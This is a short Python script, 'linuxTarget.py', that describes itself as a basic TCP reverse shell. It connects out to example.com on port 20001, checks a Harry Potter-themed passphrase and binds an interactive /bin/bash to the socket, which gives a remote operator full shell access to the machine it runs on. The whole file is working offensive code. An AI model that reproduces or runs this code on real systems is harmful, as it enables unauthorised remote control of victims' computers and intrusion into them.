#/usr/bin/python3

"""
Program: linuxTarget.py
Author: C.J. May
Description: Basic TCP reverse shell -- to be used with mediator.py server to be bridged to the reverse shell operator client connection
"""

from socket import *
import subprocess
import sys

server = socket()
server.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
server.connect((gethostbyname("example.com"), 20001))

server.sendall("Stepping onto platform nine and three quarters...".encode())

operatorKey = server.recv(1024)
if operatorKey.decode() != "I solemnly swear that I am up to no good.":
    exit()

shell = subprocess.Popen(["/bin/bash", "-i"],
                         stdin=server.makefile("rb"),
                         stdout=server.makefile("wb"),
                         stderr=subprocess.STDOUT)
shell.wait()

